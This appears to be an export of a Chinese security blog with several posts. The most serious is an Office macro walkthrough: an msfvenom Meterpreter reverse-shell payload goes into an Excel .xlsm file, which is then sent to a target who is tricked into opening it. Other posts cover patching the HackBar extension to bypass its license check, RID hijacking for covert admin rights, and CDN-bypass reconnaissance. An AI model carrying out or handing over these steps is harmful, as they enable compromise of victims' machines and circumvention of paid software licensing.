<p><img src="https://i.loli.net/2019/11/11/1vAGiqNhgcj8s9W.png" alt="57ff3f5a-f36e-4fdc-8262-aeb69ba9ae38-image.png"></p>
<p>去appdata文件夹看一下，发现配置文件自动备份了</p>
<p><img src="https://i.loli.net/2019/11/11/D8UMWBQnc5ohR6d.png" alt="9d8f70ee-3a57-4325-9c99-05f19e3ffe56-image.png"></p>
<p>我用火绒查杀一下，结果如下。不知道为啥5.0火绒不显示扫描对象的路径….</p>
<p><img src="https://i.loli.net/2019/11/11/NBwkKqWfvaZb8yH.png" alt="b308d33f-c01b-4aa8-a528-d700e157ed8d-image.png"></p>
<p>我们现在来触发一下，我打开一个测试数据库。</p>
<p><img src="https://i.loli.net/2019/11/11/NuMAe5KJi4RL8gy.png" alt="ba42c02f-e2eb-4ba3-94d4-8da9fe897c44-image.png"></p>
<p>👍 成功了</p>
<p><img src="https://i.loli.net/2019/11/11/Tt4hCx3nIr8EKPR.gif" alt="测试.gif"></p>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>想从我的口袋里拿钱？不可能！——hackbar篇</title>
    <url>/2019/09/15/%E6%83%B3%E4%BB%8E%E6%88%91%E7%9A%84%E5%8F%A3%E8%A2%8B%E9%87%8C%E6%8B%BF%E9%92%B1%EF%BC%9F%E4%B8%8D%E5%8F%AF%E8%83%BD%EF%BC%81%E2%80%94%E2%80%94hackbar%E7%AF%87/</url>
    <content><![CDATA[<p>刚刚同事需要使用hackbar，但是现在都要收费了，免费的又不好用。SO。。。。干它！</p><a id="more"></a>
<h2 id="谷歌hackbar"><a href="#谷歌hackbar" class="headerlink" title="谷歌hackbar"></a>谷歌hackbar</h2><p>下载正版hackbar，然后打开详细信息页面，查看他的ID（2019.7.18日，使用的75版本的谷歌浏览器，下载的是V2.2.6的hackbar）<br><a href="https://postimg.cc/0bwLG2mb" target="_blank" rel="noopener"><img src="https://i.postimg.cc/X7H4brYc/891ca5d3-a27b-44d4-9d67-6a32c81e740b-image.png" alt="891ca5d3-a27b-44d4-9d67-6a32c81e740b-image.png"></a><br>然后进入以下目录<br><img src="https://i.loli.net/2019/11/11/N3Ow84brzPBDelh.png" alt="b422c8c2-7e57-4007-a5d5-c1828d4a0241-image.png"><br>用编辑器打开hackbar-panel.js这个文件<br><img src="https://i.loli.net/2019/11/11/1pnSVhkCwE43zW9.png" alt="b318649e-d046-4a3f-b311-522a3a53399c-image.png"><br>在40行左右（check licese代码块）你们能找到几个disable_hackbar();的字样，吧这几个disable给注释掉，然后按同样的格式加上init();<br>(注意，第一个disable_hackbar(data.message);我改成了init(data.message); ，只要把disable_hackbar换成init即可，如果里面有其他内容的依然不能变)<br>保存，重新打开浏览器，即可看到不再询问licese</p>
<h2 id="火狐hackbar"><a href="#火狐hackbar" class="headerlink" title="火狐hackbar"></a>火狐hackbar</h2><p>和 Chrome 的插件有点不一样，firefox 的插件必须是经过签名过的，才能加载到浏览器。修改插件里的任何一个字符都会导致签名失效。非签名的只能通过临时加载插件的方式，加载到浏览器里面。这里有两个替代方案。</p>
<p>方案一：<br>使用没升级前的hackbar，升级完的是2.2.2版本，找到一个2.1.3版本，没有收费代码，可以直接加载使用。<br>hackbar2.1.3版本：<a href="https://github.com/HCTYMFF/hackbar2.1.3" target="_blank" rel="noopener">https://github.com/HCTYMFF/hackbar2.1.3</a></p>
<p>使用方法：打开firefox的插件目录，然后点 “从文件安装附加组件”</p>
<p><img src="https://i.loli.net/2019/11/11/RTtfNjvS8L7EyOd.png" alt="b7f612066507530308de0bc0d8b5d293.png"><br>加载{4c98c9c7-fc13-4622-b08a-a18923469c1c}.xpi 即可</p>
<p>方案二：<br>在火狐扩展组件商店搜索 “Max hackbar” 地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://addons.mozilla.org/zh-CN/firefox/search/?q=max hackbar&amp;platform=WINNT&amp;appver=66.0.5</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/XwFO587idNM4hgU.png" alt="e263ed45-bc51-468a-9191-c5209eb6f304-image.png"><br>基本上可以替代hackbar</p>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>正向代理和反向代理</title>
    <url>/2019/09/14/%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2019/11/11/iITSPlr1HsBUhxb.png" alt="7bf65108-52e6-4925-8d83-c413397d5a2e-image.png"></p>]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试流程图</title>
    <url>/2019/09/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E5%9B%BE/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2019/11/11/r8tuMZwNdiblVJe.jpg" alt="9.jpg"></p>]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>RID劫持笔记</title>
    <url>/2019/08/29/RID%E5%8A%AB%E6%8C%81%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>RID劫持的原理就是在注册表当中（HKLM\SAM\SAM\Domains\Account\Users），将普通用户的键值修改为管理员或者其他用户的键值。以达到登录普通用户，但是可以使用的权限却为更高级的权限的目的。</p><a id="more"></a>
<hr>
<p>主要实现方法为将普通用户对应的F值中的0030处修改为高权限用户对应的F值中的0030处的值。<br>需要注意的是</p>
<p>1、注册表需要管理员权限，msf在获取metepreter的情况下也可操作</p>
<p>2、F值是低字节序，需要倒序插入</p>
<hr>
<p>建立影子用户的后续手段便是通过RID劫持来实现的。</p>
<hr>
<p>RID<br>Windows系统帐户对应固定的RID：<br>500： administrator<br>501： guest<br>502: krbtgt(域环境)<br>512: Domain Admins(域环境)<br>513: Domain Users(域环境)<br>514: Domain Guests(域环境)<br>515: Domain Computers(域环境)<br>516: Domain Controllers(域环境)</p>
<hr>
<p>tips:<br>1、F值中的0038处为用户启用开关<br>2、F值内的数据均为16进制，可根据对应值修改<br>3、RID劫持后所登入的用户，以及使用net user xxx查看到的信息都为普通用户状态，但是实际上权限为劫持对象的权限</p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>MacbookPro上安装nmap和Metasploit</title>
    <url>/2019/08/10/MacbookPro%E4%B8%8A%E5%AE%89%E8%A3%85nmap%E5%92%8CMetasploit/</url>
    <content><![CDATA[<p>这两天刚搞完牙齿，闲着也是闲着，就想着把在mac上安装一些软件的过程记录下来，话说mac还真有一点不适应。</p><a id="more"></a>
<h2 id="安装nmap："><a href="#安装nmap：" class="headerlink" title="安装nmap："></a>安装nmap：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install nmap</span><br></pre></td></tr></table></figure>
<p>homebrew是mac上的包管理器，类似于yum或apt-get。语法简称brew。<br>nmap很简单就这一条命令就好了。</p>
<h2 id="安装metasploit："><a href="#安装metasploit：" class="headerlink" title="安装metasploit："></a>安装metasploit：</h2><p>1、先从github上克隆下来，然后进入目录，执行一下程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/rapid7/metasploit-framework.git</span><br><span class="line">cd metasploit-framework</span><br><span class="line">./msfconsole</span><br></pre></td></tr></table></figure>

<p>2、执行上面的命令时，一般会报如下错误，是说明需要对bundler进行更新。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] Bundler failed to load and returned this error:     </span><br><span class="line">&apos;cannot load such file -- bundler/setup&apos;  </span><br><span class="line">[*] You may need to uninstall or upgrade bundler</span><br></pre></td></tr></table></figure>
<p>然后执行下面的命令安装新版bundler。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gem install bundler  //需要在root用户下运行</span><br></pre></td></tr></table></figure>

<p>3、别急着执行msfconsole，他依然会报错的，但是我们现在先不管他，先安装postgresql数据库。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install postgresql  //安装postgresql</span><br></pre></td></tr></table></figure>

<p>安装完之后，我们需要将其开启。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew services start postgresql //启动postgresql 服务</span><br></pre></td></tr></table></figure>

<p>然后初始化数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">initdb /usr/local/var/postgres</span><br></pre></td></tr></table></figure>
<p>在初始化时，你会看到如下报错。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">initdb: directory &quot;/usr/local/var/postgres&quot; exists but is not empty If you want to create a new database system,</span><br><span class="line"> either remove or empty the directory &quot;/usr/local/var/postgres&quot; or run initdb with an argument other than </span><br><span class="line">&quot;/usr/local/var/postgres&quot;.</span><br></pre></td></tr></table></figure>
<p>别慌，我们只要删除一个目录就好了，执行下面的删除命令之后在执行之前的初始化命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -r /usr/local/var/postgres</span><br><span class="line"></span><br><span class="line">initdb /usr/local/var/postgres</span><br></pre></td></tr></table></figure>

<p>4、为msf创建数据库用户和密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">createuser msf -P -h localhost  //输入完会叫你设置一个密码 </span><br><span class="line">createdb -O msf msf -h localhost  // 使用msf用户创建msf数据库</span><br></pre></td></tr></table></figure>

<p>完了，我们在配置一下msf的数据库连接文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd metasploit-framework/config  //进入配置文件目录</span><br><span class="line">cp database.yml.example database.yml  //复制一份database.yml</span><br><span class="line">vim database.yml  //编辑这个yml文件</span><br><span class="line">//以下为文件的配置内容，密码处填你设置的密码。</span><br><span class="line">development: &amp;pgsql   </span><br><span class="line">adapter: postgresql   </span><br><span class="line">database: msf   </span><br><span class="line">username: msf   </span><br><span class="line">password: &lt;passwd&gt;   </span><br><span class="line">host: localhost   </span><br><span class="line">port: 5432   </span><br><span class="line">pool: 200   </span><br><span class="line">timeout: 5</span><br></pre></td></tr></table></figure>

<p>5、返回msf的根目录（就是目录名字为：metasploit-framework的目录下）开始安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bundle install --path vendor/bundle</span><br></pre></td></tr></table></figure>

<p>6、OK了，应该可以正常运行可，你们可以使用下面的命令运行了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd metasploit-framework </span><br><span class="line">./msfconsole</span><br></pre></td></tr></table></figure>
<p>7、题外话，将msfconsole等命令加入环境变量，这样我们在任意目录任意位置也可以直接输入msfconsole就可以执行程序了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &apos;alias msfconsole=&quot;～path～/metasploit-framework &amp;&amp; ./msfconsole &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc</span><br><span class="line">echo &apos;alias msfbinscan=&quot;～path～/metasploit-framework &amp;&amp; ./msfbinscan &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfd=&quot;～path～/metasploit-framework &amp;&amp; ./msfd &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfelfscan=&quot;～path～/metasploit-framework &amp;&amp; ./msfelfscan &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfmachscan=&quot;～path～/metasploit-framework &amp;&amp; ./msfmachscan &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfpescan=&quot;～path～/metasploit-framework &amp;&amp; ./msfpescan &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfrop=&quot;～path～/metasploit-framework &amp;&amp; ./msfrop &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfrpc=&quot;～path～/metasploit-framework &amp;&amp; ./msfrpc &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfrpcd=&quot;～path～/metasploit-framework &amp;&amp; ./msfrpcd &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfupdate=&quot;～path～/metasploit-framework &amp;&amp; ./msfupdate &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">echo &apos;alias msfvenom=&quot;～path～/metasploit-framework &amp;&amp; ./msfvenom &amp;&amp; cd -&quot;&apos; &gt;&gt; ~/.zshrc </span><br><span class="line">sudo chmod go+w /etc/profile </span><br><span class="line">sudo echo export MSF_DATABASE_CONFIG=～path～/metasploit-framework/config/database.yml &gt;&gt; /etc/profile</span><br></pre></td></tr></table></figure>

<p>记住，一定要将上面代码中的”～path～“换成你们msf对应的目录，不然就无法生效的。还有，我这里使用的是zsh而不是bash。自己分辨环境变量文件。</p>
<h3 id="效果图："><a href="#效果图：" class="headerlink" title="效果图："></a>效果图：</h3><p><img src="https://i.loli.net/2019/11/11/JnBswT3vuDz6aeI.png" alt="屏幕快照-2019-09-01-21.51.20.png"></p>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>office漏洞复现</title>
    <url>/2019/07/29/office%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>刚刚无聊，看到有人在讲office漏洞，所以我就顺便尝试一下。<br>首先，先生成shellcode。</p><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=*.*.*.* lport=**** -f vba -o code.txt</span><br></pre></td></tr></table></figure>
<p>生成好的shellcode呢，是文本的样子的，<br><img src="https://i.loli.net/2019/11/11/eiBFgIMW8SruzQU.png" alt="image-1-1.png"></p>
<p>要把他放在office当中。我这里就直接用的excel。</p>
<p>新建一个表格，在表格选项–信任中心–信任中心选项–宏设置中，启用所有宏</p>
<p><img src="https://i.loli.net/2019/11/11/A1emIabis7Xo2tN.png" alt="image-3.png"></p>
<p>开启录制宏，并且将shellcode编辑进宏<br>一开始的文档是没有任何宏的，需要我们手动录制一个，看下图，点开录制宏，然后再停止录制就好了<br><img src="https://i.loli.net/2019/11/11/cRDMyhQwPBftVN4.png" alt="image-4.png"><br>然后点击查看宏，就可以看到有一个“”宏1“”的东西了，然后点击编辑</p>
<p><img src="https://i.loli.net/2019/11/11/bfruqYT4eQ2Zck6.png" alt="image-5.png"></p>
<p>将shellcode复制粘贴进去就好了，直接关闭掉宏窗口，他会自动保存的<br><img src="https://i.loli.net/2019/11/11/9A5wsNaHgY4XfM7.png" alt="image-6.png"></p>
<p>然后保存整个文档，他会提示以下信息<br><img src="https://i.loli.net/2019/11/11/Z5RFCpVnUYzoLAu.png" alt="image-7.png"></p>
<p>这里选择“否”，他会跳出另存为的页面，选择第二个，保存为“.xlsm”的文件即可。</p>
<p><img src="https://i.loli.net/2019/11/11/j476MnY8wQSZiIo.png" alt="image-9.png"></p>
<p>随后，在自己的VPS上监听（需要跟开始设置的shellcode配置相同的ip和端口）。</p>
<p><img src="https://i.loli.net/2019/11/11/nLc2J51MPYaKH9p.png" alt="image-11.png"></p>
<p>然后将文档发给目标，通过社工等任意方法，让其打开该文档即可反弹shell。下面是我自己打开的样子。</p>
<p><img src="https://i.loli.net/2019/11/11/9sOXM4lEAGpnJZt.png" alt="image-12.png"></p>
<p>因为该shell只有在打开文档的情况下连接，所以我就用了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
<p>来自动迁移进稳定的进程了，并且看到我的电脑用户名叫pt。拿到shell了后面的事就不在介绍了。</p>
]]></content>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>如何绕过CDN寻找真实目标IP</title>
    <url>/2019/07/16/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9E%E7%9B%AE%E6%A0%87IP/</url>
    <content><![CDATA[<p>在渗透过程中，目标站点的真实IP对我们来说是非常关键的起始点，但是现在大部分网站都会利用CDN来加速并且隐藏自己的真实IP地址。那如何寻找目标的真实IP地址？以下为网上的方法做个总结：</p><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">二级域名法</span><br><span class="line">目标网站的二级域名一般性是不会做CDN的，我们只需找到目标站点的所有二级域名，然后逐个排查，然后筛选出没有做CDN的二级域名，在本地将目标域名绑定到无CDN的二级域名IP地址，能访问说明目标站与此二级域名在同一个服务器上，或者同C段上。</span><br><span class="line"></span><br><span class="line">Nslookup法</span><br><span class="line">因国内大部分CDN运营商的服务只针对国内市场，而对国外几乎是不做CDN的，所以我们有很大的几率会直接解析到真实IP。方法1：上国外VPN ping目标域名。或者简单点的方法2：&#123; nslookup 目标域名 国外DNS &#125;。与方法1同理，就是通过国外DNS服务器查目标域名IP。使用方法二时，需要注意的是我们要同过哇哦冷门的DNS，因为像谷歌的DNS国内用的人都比较多，很多CDN运营商都把谷歌DNS作为国内市场之一，所以通过谷歌DNS查到的结果和国内差不多。方法3：查目标域名的NS记录，其域名记录的MX记录，TXT记录等很有可能指向的是真实IP。</span><br><span class="line"></span><br><span class="line">Ping法</span><br><span class="line">Ping方法使用时，应该注意命令这样写：&#123; ping xxx.com &#125; 而不是 &#123; ping www.xxx.com &#125; ，原因是现在很多CDN厂商只要求把www.xxx.com的域名别名记录到CDN主服务器上。www.xxx.com和xxx.com是两条独立的解析记录，一般只会把www.xxx.com做CDN。</span><br><span class="line">另外也可以使用国外多节点ping工具，例如just-ping，全世界几十个节点ping目标域名，很有可能找到真实IP。地址：https://asm.ca.com/en/ping.php</span><br><span class="line"></span><br><span class="line">查看历史记录</span><br><span class="line">查找域名的历史解析激励，因为域名在上CDN之前是用的IP地址，很有可能就是CDN的真实源IP地址，这里有个专门提供域名解析历史记录查询的网站，地址：https://toolbar.netcraft.com/site_report</span><br><span class="line"></span><br><span class="line">phpinfo法</span><br><span class="line">大部分网站都会放phpinfo页面，而phpinfo页面中就会显示站点的真实IP，这种方法需要看路径字典强度，或者也可以google目标站点的配置文件也可以。</span><br><span class="line"></span><br><span class="line">订阅邮件法</span><br><span class="line">有的服务器本地自带sendmail功能，注册后，会给我们发一封邮件，我们查看邮件的源代码，其中可以看到服务器的真实IP。有的大型互联网网站会有自己的邮件服务器，有可能会是处在同网段的。</span><br><span class="line"></span><br><span class="line">RSS订阅法</span><br><span class="line">通过RSS订阅一般也可以得到真实IP。</span><br><span class="line"></span><br><span class="line">图片上传法</span><br><span class="line">有的网站是支持通过URL来上传头像或图片的，我们只要放一张图片在自己的WEB服务器上，然后通过URL上传图片。之后查看网站的日志就可以找到目标站点的真实IP。</span><br></pre></td></tr></table></figure>
<p>2019.7.18补充<br>内容分发网络(content delivery network或content distribution network，缩写作CDN)指一种通过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p>
<p>CDN节点会在多个地点，不同的网络上摆放。这些节点之间会动态的互相传输内容，对用户的下载行为最优化，并借此减少内容供应者所需要的带宽成本，改善用户的下载速度，提高系统的稳定性。国内常见的CDN有ChinanNet Center（网宿科技）、ChinaCache（阿里云）等，国外常见的有Akamai(阿卡迈)、Limelight Networks（简称LLNW）等</p>
<p>用户会先经由CDN节点，然后再访问web服务器。</p>
<ul>
<li>当网站有CDN时如何查询真实IP地址</li>
</ul>
<p>1.查询历史DNS记录<br>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br>输入：baidu.com type:A 可以收集到百度的子域名和ip<br><img src="https://i.loli.net/2019/11/11/ntURxm2WKgZfOCX.png" alt="62e01ccf-2948-40d9-96b6-377fd3120523-image.png"></p>
<p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></p>
<p><img src="https://i.loli.net/2019/11/11/aq7opgInlzTyVvB.png" alt="429f53d3-9a50-4552-81d2-da49cafb8f7c-image.png"></p>
<p>输入域名后</p>
<p><img src="https://i.loli.net/2019/11/11/bsh9FSayeW7nOKL.png" alt="88236b0b-b78d-4bf4-9ddd-9df2e0de7a12-image.png"></p>
<p>可以查看历史IP<br><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a></p>
<p><a href="https://postimg.cc/Z94W4X94" target="_blank" rel="noopener"><img src="https://i.postimg.cc/nLQBYJpj/540971f0-dfd4-4b90-a790-f0db73a6b758-image.png" alt="540971f0-dfd4-4b90-a790-f0db73a6b758-image.png"></a></p>
<p><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a></p>
<p><a href="https://postimg.cc/nXtzGNGB" target="_blank" rel="noopener"><img src="https://i.postimg.cc/MpnQqScP/10f2d324-8a35-48ef-8002-1ec81222829a-image.png" alt="10f2d324-8a35-48ef-8002-1ec81222829a-image.png"></a></p>
<p>2.子域名查找法<br>因为cdn和反向代理是需要成本的，有的网站只在比较常用的域名使用cdn或反向代理，有的时候一些测试子域名和新的子域名都没来得及加入cdn和反向代理，所以有时候是通过查找子域名来查找网站的真实IP。</p>
<p>可以通过各类扫描子域名的工具来查找子域名并解析ip地址，例如子域名挖掘机，sublist3r等。</p>
<p>3.nslookup法<br>大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。其实这个方法根本不用上国外vpn，因为你上国外vpn的ping本质，就是使用国外dns（那台vpn服务器使用的dns）查询域名而已，所以只需要：nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 国外dns，就行了，例如：nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 8.8.8.8，提示：你要找冷门国外DNS才行，像谷歌的DNS，国内用的人越来越多了，很多CDN提供商都把谷歌DNS作为国内市场之一，所以，你查到的结果会和国内差不了多少。</p>
<p>或者查询域名的NS记录，其域名记录中的MX记录，TXT记录等很有可能指向的是真实ip或同C段服务器</p>
<p>4.ping法<br>ping 命令这样写 ping <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 而不是 ping www. xxx .com，ping <a href="http://xxx.com一般都会是真实IP，因为了解到现有很多CDN厂商基本只要求把" target="_blank" rel="noopener">http://xxx.com一般都会是真实IP，因为了解到现有很多CDN厂商基本只要求把</a> www. xxx .com cname到cdn主服务器上去。www. xxx .com 和 <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 是两条独立的解析记录，一般只会把 www. xxx .com 做 CDN。</p>
<p>或者使用国外的多节点ping工具，例如just-ping，全世界几十个节点ping目标域名，很有可能找到真实ip。域名：<a href="http://www.just-ping.com/。" target="_blank" rel="noopener">http://www.just-ping.com/。</a><br>5.网站漏洞查找法<br>通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实IP。</p>
<hr>
<p>另外还可以看一下P牛的文章：微信公众号-<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247491648&idx=1&sn=64d948bfc39f7122ce7aa5da63536b42&chksm=ec1dd068db6a597e27843ea34b430216b8397ac278fe6ccc1691ed6e251e51ac5e18f681b879&mpshare=1&scene=1&srcid=&sharer_sharetime=1573456653875&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=09ecea659c050ec8bed318f48239520ddc1d87fe54141e20e266a667c52bd868ba31814c794794d5ac15ab5f83488369a9c33273963afaf91a7fedd6b4cd1869e051789ca6136ba8f96c000790d9439a&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070158&lang=zh_CN&pass_ticket=0ASEAASCy9iO0BLIChJY1rNjU0BnX3nSA1%2B5OCp4nPSrf0XVss2prhA5wKdLI74Z" target="_blank" rel="noopener">信安之路</a></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>nodebb论坛搭建过程</title>
    <url>/2019/07/15/nodebb%E8%AE%BA%E5%9D%9B%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为原有的论坛升级不了（没钱买商业版的！）而且那个论坛看久了觉得又老又丑，所以打算重新搭建一个论坛。在网上找了半个月了，发现国内的程序太笨重了，还是在国外的社交网站上找到了几个，原本想搭建Flarum的论坛的，但是flarum经历了8年的开发还是bate版的，而且插件也不是很友好，就算了。重新找了一个国外比较火的nodebb。也就是我们论坛现在的程序。基于node.js的。还算可以。</p><a id="more"></a>
<p>为了搭建这个论坛，从在自己的虚拟机模拟环境到在阿里云上搭建，花了我半个月的时间吧（上班也在看这东西），其中老是找老马重置阿里云服务器也是费了不少功夫，挺麻烦了，我估摸着重置服务器大概10+次了吧，各种各样的问题都有，错一步都不行。还是辛苦老马了，无时无刻都给我提供阿里云的验证码。</p>
<p>下面的搭建步骤都是我经过十几次的错误总结出来的，因为这个程序在国内使用的组织不超过5个，所以很多网上的教程都是直接翻译外国人的，其实他们自己都看不懂自己在写什么。这套优秀的程序虽然我不懂为啥在国内火不起来（有可能是买不到nodebb的授权或者搭建很困难），但是既然被我发现了，那就要好好利用一下。</p>
<p>说到搭建困难，这套程序的每一个步骤都是非常关键的，就算是你从github上下载源码，都不一定能搭建成功，而且这个程序中很多架构是需要翻墙才能加载的，阿里云不让翻，所以我也特地把教程中所有的用到“外网”的东西全都用国内大佬特制的命令“汉化”了</p>
<p>这套教程，能卖200！别问我为什么，因为我当初快要放弃的时候，我想找人帮我搭建完事，一看，卧槽，没钱！还是自己消耗生命划算！</p>
<p><img src="https://i.loli.net/2019/11/10/I54YMEcLo6pzbqJ.png" alt="image-1-288x300.png"></p>
<p>OK,进入正文！</p>
<hr>
<h2 id="1-更新源，关防火墙"><a href="#1-更新源，关防火墙" class="headerlink" title="1.更新源，关防火墙"></a>1.更新源，关防火墙</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ yum -y update</span><br><span class="line">$ yum -y install epel-release</span><br><span class="line">$ yum -y groupinstall &quot;Development Tools&quot;</span><br><span class="line">$ yum -y install git ImageMagick ImageMagick-devel</span><br><span class="line"></span><br><span class="line">查看防火墙状态</span><br><span class="line">firewall-cmd --state</span><br><span class="line">停止firewall</span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">禁止firewall开机启动</span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>
<h2 id="2-NODEJS安装"><a href="#2-NODEJS安装" class="headerlink" title="2.NODEJS安装"></a>2.NODEJS安装</h2><p>安装NVM</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.8/install.sh | bash</span><br></pre></td></tr></table></figure>
<p>使环境变量的修改生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ source ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>检查是否成功安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ command -v nvm</span><br></pre></td></tr></table></figure>
<p>让NVM使用淘宝源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ export NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node</span><br><span class="line">$ export NVM_IOJS_ORG_MIRROR=http://npm.taobao.org/mirrors/iojs</span><br></pre></td></tr></table></figure>
<p>安装Node.js LTS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nvm install --lts</span><br></pre></td></tr></table></figure>
<p>查看是否搭建nodejs成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ node -v &amp;&amp; npm -v</span><br></pre></td></tr></table></figure>
<p>npm更换为cnpm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
<h2 id="3-MONGODB安装"><a href="#3-MONGODB安装" class="headerlink" title="3.MONGODB安装"></a>3.MONGODB安装</h2><p>配置 MongoDB yum 源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/yum.repos.d/mongodb-org-4.0.repo</span><br></pre></td></tr></table></figure>
<p>把下面的内容复制进去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mongodb-org-4.0] </span><br><span class="line">name = MongoDB Repository </span><br><span class="line">baseurl = https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/4.0/x86_64/ </span><br><span class="line">gpgcheck = 1 </span><br><span class="line">enabled = 1 </span><br><span class="line">gpgkey = https://www.mongodb.org/static/pgp/server-4.0.asc</span><br></pre></td></tr></table></figure>
<p>更新文件，安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ yum update</span><br><span class="line">$ yum -y install mongodb-org</span><br></pre></td></tr></table></figure>
<p>查看 Mongodb 版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mongod --version</span><br><span class="line">请检查你的 MongoDB 版本是否大于或等于3.4.10，如果不是请立即升级（以前的版本存在严重的安全风险）！</span><br></pre></td></tr></table></figure>
<p>安装完成后，为了消除 MongoDB 的性能警告，需要关闭 Linux 巨型页：</p>
